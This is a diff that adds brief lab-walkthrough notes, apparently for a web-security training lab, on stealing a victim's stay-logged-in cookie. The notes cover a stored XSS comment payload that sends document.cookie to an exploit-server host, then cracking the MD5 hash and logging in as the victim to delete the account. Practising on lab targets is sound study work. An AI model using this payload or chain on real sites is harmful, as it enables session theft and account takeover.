@@ -114,6 +114,21 @@
 		
 		
 		
+		[Offline password cracking]
+	
+		we need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
+		first login into account using valid credential information.
+	
+		post a comment for XSS 
+			
+			<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
+
+		On the exploit server, open the access log. There should be a GET request from the victim containing their stay-logged-in cookie.
+		decode base64 and decrypt md5 
+		
+		login with this credential and delete this account
+		
+		
 		
 
 
